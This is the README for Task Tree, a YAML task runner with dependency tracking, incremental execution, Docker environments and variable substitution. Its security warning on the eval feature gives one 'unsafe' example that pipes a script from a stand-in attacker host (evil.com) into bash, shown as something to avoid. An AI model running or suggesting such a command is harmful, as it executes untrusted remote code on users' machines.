# Task Tree (tt)

[![Tests](https://github.com/kevinchannon/task-tree/actions/workflows/test.yml/badge.svg)](https://github.com/kevinchannon/task-tree/actions/workflows/test.yml)

A task automation tool that combines simple command execution with dependency tracking and incremental execution.

## Motivation
In any project of even moderate size, various scripts inevitably come into being along the way. These scripts often must be run in a particular order, or at a particular time. For historical reasons, this almost certainly a problem if your project is developed in a Linux environment; in Windows, an IDE like Visual Studio may be taking care of a significant proportion of your build, packaging and deployment tasks. Then again, it may not...

The various incantations that have to be issued to build, package, test and deploy a project can build up and then all of a sudden there's only a few people that remember which to invoke and when and then people start making helpful readme guides on what to do with the scripts and then those become out of date and start telling lies about things and so on.

Then there's the scripts themselves. In Linux, they're probably a big pile of Bash and Python, or something (Ruby, Perl, you name it). You can bet the house on people solving the problem of passing parameters to their scripts in a whole bunch of different and inconsistent ways.

```bash
#!/usr/bin/env bash
# It's an environment variable defined.... somewhere?
echo "FOO is: $FOO"
```
```bash
#!/usr/bin/env bash
# Using simple positional arguments... guess what means what when you're invoking it!
echo "First: $1, Second: $2"
```
```bash
#!/usr/bin/env bash
# Oooooh fancy "make me look like a proper app" named option parsing... don't try and do --foo=bar though!
FOO=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        --foo) FOO=$2; shift ;;
        --)    break ;;
        *)     echo "Unknown: $1";;
    esac
    shift
done
```
```bash
#!/usr/bin/env bash
# This thing...
ARGS=$(getopt -o f:b --long foo:,bar: -n 'myscript' -- "$@")
eval set -- "$ARGS"
while true; do
    case "$1" in
        -b|--bar) echo "Bar: $2"; shift 2 ;;
        -f|--foo) echo "Foo: $2"; shift 2 ;;
        --) shift; break ;;
        *) break ;;
    esac
done
```

What about help info? Who has time to wire that in?

### The point
Is this just whining and moaning? Should we just man up and revel in our own ability to memorize all the right incantations like some kind of scripting shaman?

... No. That's **a dumb idea**.

Task Tree allows you to pile all the knowledge of **what** to run, **when** to run it, **where** to run it and **how** to run it into a single, readable place. Then you can delete all the scripts that no-one knows how to use and all the readme docs that lie to the few people that actually waste their time reading them.

The tasks you need to perform to deliver your project become summarised in an executable file that looks like:
```yaml
tasks:
  build:
    desc: Compile stuff
    outputs: [target/release/bin]
    cmd: cargo build --release

  package:
     desc: build installers
     deps: [build]
     outputs: [awesome.deb]
     cmd: |
        for bin in target/release/*; do
            if [[ -x "$bin" && ! -d "$bin" ]]; then
                install -Dm755 "$bin" "debian/awesome/usr/bin/$(basename "$bin")"
            fi
        done

        dpkg-buildpackage -us -uc

  test:
    desc: Run tests
    deps: [package]
    inputs: [tests/**/*.py]
    cmd: PYTHONPATH=src python3 -m pytest tests/ -v
```

If you want to run the tests then:
```bash
tt test
```
Boom! Done. `build` will always run, because there's no sensible way to know what Cargo did. However, if Cargo decided that nothing needed to be done and didn't touch the binaries, then `package` will realize that and not do anything. Then `test` will just run with the new tests that you just wrote. If you then immediately run `test` again, then `test` will figure out that none of the dependencies did anything and that none of the test files have changed and then just _do nothing_ - as it should.

This is a toy example, but you can image how it plays out on a more complex project.

## Installation

### From PyPI (Recommended)

```bash
pipx install tasktree
```

If you have multiple Python interpreter versions installed, and the _default_ interpreter is a version <3.11, then you can use `pipx`'s `--python` option to specify an interpreter with a version >=3.11:

```bash
# If the target version is on the PATH
pipx install --python python3.12 tasktree

# With a path to an interpreter
pipx install --python /path/to/python3.12 tasktree
```

### From Source

For the latest unreleased version from GitHub:

```bash
pipx install git+https://github.com/kevinchannon/task-tree.git
```

Or to install from a local clone:

```bash
git clone https://github.com/kevinchannon/task-tree.git
cd tasktree
pipx install .
```

## Editor Support

Task Tree includes a [JSON Schema](schema/tasktree-schema.json) that provides autocomplete, validation, and documentation in modern editors.

### VS Code

Install the [YAML extension](https://marketplace.visualstudio.com/items?itemName=redhat.vscode-yaml), then add to your workspace `.vscode/settings.json`:

```json
{
  "yaml.schemas": {
    "https://raw.githubusercontent.com/kevinchannon/tasktree/main/schema/tasktree-schema.json": [
      "tasktree.yaml",
      "tt.yaml"
    ]
  }
}
```

Or add a comment at the top of your `tasktree.yaml`:

```yaml
# yaml-language-server: $schema=https://raw.githubusercontent.com/kevinchannon/tasktree/main/schema/tasktree-schema.json

tasks:
  build:
    cmd: cargo build
```

See [schema/README.md](schema/README.md) for IntelliJ/PyCharm and command-line validation.

## Quick Start

Create a `tasktree.yaml` (or `tt.yaml`) in your project:

```yaml
tasks:
  build:
    desc: Compile the application
    outputs: [target/release/bin]
    cmd: cargo build --release

  test:
    desc: Run tests
    deps: [build]
    cmd: cargo test
```

Run tasks:

```bash
tt                # Print the help
tt --help         # ...also print the help
tt --list         # Show all available tasks
tt build          # Build the application (assuming this is in your tasktree.yaml)
tt test           # Run tests (builds first if needed)
```

## Core Concepts

### Intelligent Incremental Execution

Task Tree only runs tasks when necessary. A task executes if:

- Its definition (command, outputs, working directory, environment) has changed
- Any input files have changed since the last run
- Any dependencies have re-run
- It has never been executed before
- It has no inputs or outputs (always runs)
- The execution environment has changed (CLI override or environment config change)

### Automatic Input Inheritance

Tasks automatically inherit inputs from dependencies, eliminating redundant declarations:

```yaml
tasks:
  build:
    outputs: [dist/app]
    cmd: go build -o dist/app

  package:
    deps: [build]
    outputs: [dist/app.tar.gz]
    cmd: tar czf dist/app.tar.gz dist/app
    # Automatically tracks dist/app as an input
```

### Single State File

All state lives in `.tasktree-state` at your project root. Stale entries are automatically pruned—no manual cleanup needed.

## Task Definition

### Basic Structure

```yaml
tasks:
  task-name:
    desc: Human-readable description (optional)
    deps: [other-task]                     # Task dependencies
    inputs: [src/**/*.go]                  # Explicit input files (glob patterns)
    outputs: [dist/binary]                 # Output files (glob patterns)
    working_dir: subproject/               # Execution directory (default: project root)
    env: bash-strict                       # Execution environment (optional)
    args: [param1, param2:path=default]    # Task parameters
    cmd: go build -o dist/binary           # Command to execute
```

### Commands

**Single-line commands** are executed directly via the configured shell:

```yaml
tasks:
  build:
    cmd: cargo build --release
```

**Multi-line commands** are written to temporary script files for proper execution:

```yaml
tasks:
  deploy:
    cmd: |
      mkdir -p dist
      cp build/* dist/
      rsync -av dist/ server:/opt/app/
```

Multi-line commands preserve shell syntax (line continuations, heredocs, etc.) and support shebangs on Unix/macOS.

Or use folded blocks for long single-line commands:

```yaml
tasks:
  compile:
    cmd: >
      gcc -o bin/app
      src/*.c
      -I include
      -L lib -lm
```

### Execution Environments

Configure custom shell environments for task execution:

```yaml
environments:
  default: bash-strict

  bash-strict:
    shell: bash
    args: ['-c']              # For single-line: bash -c "command"
    preamble: |               # For multi-line: prepended to script
      set -euo pipefail

  python:
    shell: python
    args: ['-c']

  powershell:
    shell: powershell
    args: ['-ExecutionPolicy', 'Bypass', '-Command']
    preamble: |
      $ErrorActionPreference = 'Stop'

tasks:
  build:
    # Uses 'default' environment (bash-strict)
    cmd: cargo build --release

  analyze:
    env: python
    cmd: |
      import sys
      print(f"Analyzing with Python {sys.version}")
      # ... analysis code ...

  windows-task:
    env: powershell
    cmd: |
      Compress-Archive -Path dist/* -DestinationPath package.zip
```

**Environment resolution priority:**
1. CLI override: `tt --env python build`
2. Task's `env` field
3. Recipe's `default` environment
4. Platform default (bash on Unix, cmd on Windows)

**Platform defaults** when no environments are configured:
- **Unix/macOS**: bash with `-c` args
- **Windows**: cmd with `/c` args

### Docker Environments

Execute tasks inside Docker containers for reproducible builds and isolated execution:

```yaml
environments:
  builder:
    dockerfile: build.dockerfile
    context: .
    volumes:
      - .:/workspace
    working_dir: /workspace

tasks:
  build:
    env: builder
    cmd: cargo build --release
```

#### User Mapping

By default, tasks run inside Docker containers execute as your current host user (UID:GID) rather than root. This ensures files created in mounted volumes have correct ownership on the host filesystem.

To run as root inside the container (e.g., for package installation or privileged operations), set `run_as_root: true`:

```yaml
environments:
  privileged:
    dockerfile: admin.dockerfile
    context: .
    run_as_root: true
    volumes:
      - .:/workspace
```

**Note**: On Windows, user mapping is handled automatically by Docker Desktop and this setting has no effect.

#### Use Cases for `run_as_root: true`

You may need to set `run_as_root: true` when:
- Container process needs to bind to privileged ports (<1024)
- Installing packages during task execution
- Software explicitly requires root privileges

### Parameterised Tasks

Tasks can accept arguments with optional defaults:

```yaml
tasks:
  deploy:
    args: [environment, region=eu-west-1]
    deps: [build]
    cmd: |
      aws s3 cp dist/app.zip s3://{{ arg.environment }}-{{ arg.region }}/
      aws lambda update-function-code --function-name app-{{ arg.environment }}
```

Invoke with: `tt deploy production` or `tt deploy staging us-east-1` or `tt deploy staging region=us-east-1`. 

Arguments may be typed, or not and have a default, or not. Valid argument types are:

* int - an integer value (e.g. 0, 10, 123, -9)
* float - a floating point value (e.g. 1.234, -3.1415, 2e-4)
* bool - Boolean-ish value (e.g. true, false, yes, no, 1, 0, etc)
* str - a string
* path - a pathlike string
* datetime - a datetime in the format 2025-12-17T16:56:12
* ip - an ip address (v4 or v6)
* ipv4 - an IPv4 value
* ipv6 - an IPv6 value
* email - String validated, but not positively confirmed to be a reachable address.
* hostname - looks like a hostname, resolution of the name is not attempted as part of the validation

Different argument values are tracked separately—tasks re-run when invoked with new arguments.

## Environment Variables

Task Tree supports reading environment variables in two ways:

### Direct Substitution

Reference environment variables directly in task commands using `{{ env.VAR_NAME }}`:

```yaml
tasks:
  deploy:
    args: [target]
    cmd: |
      echo "Deploying to {{ arg.target }}"
      echo "User: {{ env.USER }}"
      scp package.tar.gz {{ env.DEPLOY_USER }}@{{ arg.target }}:/opt/
```

```bash
export DEPLOY_USER=admin
tt deploy production
```

Environment variables are resolved at execution time, just before the task runs.

### Via Variables Section

For more complex scenarios, define environment variables in the `variables` section:

```yaml
variables:
  # Direct env reference (resolved at parse time)
  api_key: { env: API_KEY }
  db_host: { env: DATABASE_HOST }

  # Or using string substitution
  deploy_user: "{{ env.DEPLOY_USER }}"

  # Compose with other variables
  connection: "{{ var.db_host }}:5432"
  api_url: "https://{{ var.db_host }}/api"

tasks:
  deploy:
    cmd: |
      curl -H "Authorization: Bearer {{ var.api_key }}" {{ var.api_url }}
      ssh {{ var.deploy_user }}@{{ var.db_host }} /opt/deploy.sh
```

**Key differences:**
- **`{ env: VAR }`** — Resolved at parse time (when `tt` starts)
- **`"{{ env.VAR }}"`** — Resolved at parse time in variables, execution time in tasks
- **Direct `{{ env.VAR }}`** — Resolved at execution time

### When to Use Which

**Use direct substitution** (`{{ env.VAR }}`) when:
- You need simple, one-off environment variable references
- The value is used in a single place
- You want the value resolved at execution time

**Use variables section** when:
- You need to compose values from multiple sources
- The same value is used in multiple places
- You need variable-in-variable expansion

**Examples:**

```yaml
variables:
  # Compose configuration from environment
  home: { env: HOME }
  config_dir: "{{ var.home }}/.myapp"

tasks:
  # Direct reference for simple cases
  show-user:
    cmd: echo "Running as {{ env.USER }}"

  # Mixed usage
  deploy:
    args: [app]
    cmd: |
      echo "Config: {{ var.config_dir }}"
      echo "Deploying {{ arg.app }} as {{ env.DEPLOY_USER }}"
```

**Environment variable values are always strings**, even if they look like numbers.

### Working Directory

Environment variables work in `working_dir` as well:

```yaml
tasks:
  build:
    working_dir: "{{ env.BUILD_DIR }}"
    cmd: make all
```

### Evaluating Commands in Variables

Variables can be populated by executing shell commands using `{ eval: command }`:

```yaml
variables:
  git_hash: { eval: "git rev-parse --short HEAD" }
  timestamp: { eval: "date +%Y%m%d-%H%M%S" }
  image_tag: "myapp:{{ var.git_hash }}"

tasks:
  build:
    cmd: docker build -t {{ var.image_tag }} .
```

**Execution:**

- Commands are executed when `tt` starts (parse time), before any task execution
- Working directory is the recipe file location
- Uses `default_env` shell if specified in the recipe, otherwise platform default (bash on Unix, cmd on Windows)
- Stdout is captured as the variable value
- Stderr is ignored (or printed to terminal, not captured)
- Trailing newline is automatically stripped (like `{ read: ... }`)

**Exit codes:**

Commands must succeed (exit code 0) or `tt` will fail with an error:

```
Command failed for variable 'git_hash': git rev-parse --short HEAD
Exit code: 128
stderr: fatal: not a git repository (or any of the parent directories): .git

Ensure the command succeeds when run from the recipe file location.
```

**⚠️ Security Warning**

The `{ eval: command }` feature executes shell commands with your current permissions when `tt` starts.

**DO NOT** use recipes from untrusted sources that contain `{ eval: ... }`.

Commands execute with:
- Your current user permissions
- Access to your environment variables
- The recipe file directory as working directory

**Best practices:**
- Only use `eval` in recipes you've written or thoroughly reviewed
- Avoid complex commands with side effects
- Prefer `{ read: file }` or `{ env: VAR }` when possible
- Use for read-only operations (git info, vault reads, system info)

**Example safe uses:**

```yaml
variables:
  # Version control information
  version: { eval: "git describe --tags" }
  commit: { eval: "git rev-parse HEAD" }
  branch: { eval: "git rev-parse --abbrev-ref HEAD" }

  # System information
  hostname: { eval: "hostname" }
  username: { eval: "whoami" }

  # Secrets management (read-only)
  vault_token: { eval: "vault read -field=token secret/api" }
```

**Example unsafe uses:**

```yaml
variables:
  # DON'T DO THIS - modifies state at parse time
  counter: { eval: "expr $(cat counter) + 1 > counter && cat counter" }

  # DON'T DO THIS - downloads and executes code
  script: { eval: "curl https://evil.com/script.sh | bash" }
```

**Use cases:**

1. **Version control info** - Embed git commit hashes, tags, or branch names in builds
2. **Secrets management** - Read API tokens from secret vaults (Vault, AWS Secrets Manager, etc.)
3. **System information** - Capture hostname, username, or timestamp for deployments
4. **Dynamic configuration** - Read values from external tools or configuration systems

**Type handling:**

Eval output is always a string, even if the command outputs a number:

```yaml
variables:
  port: { eval: "echo 8080" }  # port = "8080" (string, not int)
```

**Performance note:**

Every `{ eval: ... }` runs a subprocess at parse time, adding startup latency. For frequently-run tasks, consider caching results in files or using `{ read: ... }` to read pre-computed values.

## File Imports

Split task definitions across multiple files for better organisation:

```yaml
# tasktree.yaml
imports:
  - file: build/tasks.yml
    as: build
  - file: deploy/tasks.yml
    as: deploy

tasks:
  test:
    deps: [build.compile, build.test-compile]
    cmd: ./run-tests.sh

  ci:
    deps: [build.all, test, deploy.staging]
```

Imported tasks are namespaced and can be referenced as dependencies. Each imported file is self-contained—it cannot depend on tasks in the importing file.

## Glob Patterns

Input and output patterns support standard glob syntax:

- `src/*.rs` — All Rust files in `src/`
- `src/**/*.rs` — All Rust files recursively
- `{file1,file2}` — Specific files
- `**/*.{js,ts}` — Multiple extensions recursively

## State Management

### How State Works

Each task is identified by a hash of its definition. The hash includes:

- Command to execute
- Output patterns
- Working directory
- Argument definitions
- Execution environment

State tracks:
- When the task last ran
- Timestamps of input files at that time

Tasks are re-run when their definition changes, inputs are newer than the last run, or the environment changes.

### What's Not In The Hash

Changes to these don't invalidate cached state:

- Task name (tasks can be renamed freely)
- Description
- Dependencies (only affects execution order)
- Explicit inputs (tracked by timestamp, not definition)

### Automatic Cleanup

At the start of each invocation, state is checked for invalid task hashes and non-existent ones are automatically removed. Delete a task from your recipe file and its state disappears the next time you run `tt <cmd>`

## Command-Line Options

Task Tree provides several command-line options for controlling task execution:

### Execution Control

```bash
# Force re-run (ignore freshness checks)
tt --force build
tt -f build

# Run only the specified task, skip dependencies (implies --force)
tt --only deploy
tt -o deploy

# Override environment for all tasks
tt --env python analyze
tt -e powershell build
```

### Information Commands

```bash
# List all available tasks
tt --list
tt -l

# Show detailed task definition
tt --show build

# Show dependency tree (without execution)
tt --tree deploy

# Show version
tt --version
tt -v

# Create a blank recipe file
tt --init
```

### State Management

```bash
# Remove state file (reset task cache)
tt --clean
tt --clean-state
tt --reset
```

### Common Workflows

```bash
# Fresh build of everything
tt --force build

# Run a task without rebuilding dependencies
tt --only test

# Test with a different shell/environment
tt --env python test

# Force rebuild and deploy
tt --force deploy production
```

## Example: Full Build Pipeline

```yaml
imports:
  - file: common/docker.yml
    as: docker

tasks:
  compile:
    desc: Build application binaries
    outputs: [target/release/app]
    cmd: cargo build --release

  test-unit:
    desc: Run unit tests
    deps: [compile]
    cmd: cargo test

  package:
    desc: Create distribution archive
    deps: [compile]
    outputs: [dist/app-{{ arg.version }}.tar.gz]
    args: [version]
    cmd: |
      mkdir -p dist
      tar czf dist/app-{{ arg.version }}.tar.gz \
        target/release/app \
        config/ \
        migrations/

  deploy:
    desc: Deploy to environment
    deps: [package, docker.build-runtime]
    args: [environment, version]
    cmd: |
      scp dist/app-{{ arg.version }}.tar.gz {{ env.DEPLOY_USER }}@{{ arg.environment }}:/opt/
      ssh {{ env.DEPLOY_USER }}@{{ arg.environment }} /opt/deploy.sh {{ arg.version }}

  integration-test:
    desc: Run integration tests against deployed environment
    deps: [deploy]
    args: [environment, version]
    cmd: pytest tests/integration/ --env={{ arg.environment }}
```

Run the full pipeline:

```bash
export DEPLOY_USER=admin
tt integration-test staging version=1.2.3
```

This will:
1. Compile if sources have changed
2. Run unit tests if compilation ran
3. Package if compilation ran or version argument is new
4. Build Docker runtime (from imported file) if needed
5. Deploy if package or Docker image changed
6. Run integration tests (always runs)

## Implementation Notes

Built with Python 3.11+ using:

- **PyYAML** for recipe parsing
- **Typer**, **Click**, **Rich** for CLI
- **graphlib.TopologicalSorter** for dependency resolution
- **pathlib** for file operations and glob expansion

State file uses JSON format for simplicity and standard library compatibility.

## Development

### Setup Development Environment

```bash
# Clone repository
git clone https://github.com/kevinchannon/task-tree.git
cd tasktree

# Install uv (if not already installed)
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install dependencies
uv sync

# Install in editable mode
pipx install -e .
```

### Running Tests

```bash
# Run all tests
uv run pytest

# Run with verbose output
uv run pytest -v

# Run specific test file
uv run pytest tests/unit/test_executor.py
```

### Using Task Tree for Development

The repository includes a `tasktree.yaml` with development tasks:

```bash
tt test          # Run tests
tt build         # Build wheel package
tt install-dev   # Install package in development mode
tt clean         # Remove build artifacts
```

## Releasing

New releases are created by pushing version tags to GitHub. The release workflow automatically:
- Builds wheel and source distributions
- Creates a GitHub Release with artifacts
- Publishes to PyPI via trusted publishing

### Release Process

1. Ensure main branch is ready:
```bash
git checkout main
git pull
```

2. Create and push a version tag:
```bash
git tag v1.0.0
git push origin v1.0.0
```

3. GitHub Actions will automatically:
   - Extract version from tag (e.g., `v1.0.0` → `1.0.0`)
   - Update `pyproject.toml` with the version
   - Build wheel and sdist
   - Create GitHub Release
   - Publish to PyPI

4. Verify the release:
   - GitHub: https://github.com/kevinchannon/task-tree/releases
   - PyPI: https://pypi.org/kevinchannon/tasktree/
   - Test: `pipx install --force tasktree`

### Version Numbering

Follow semantic versioning:
- `v1.0.0` - Major release (breaking changes)
- `v1.1.0` - Minor release (new features, backward compatible)
- `v1.1.1` - Patch release (bug fixes)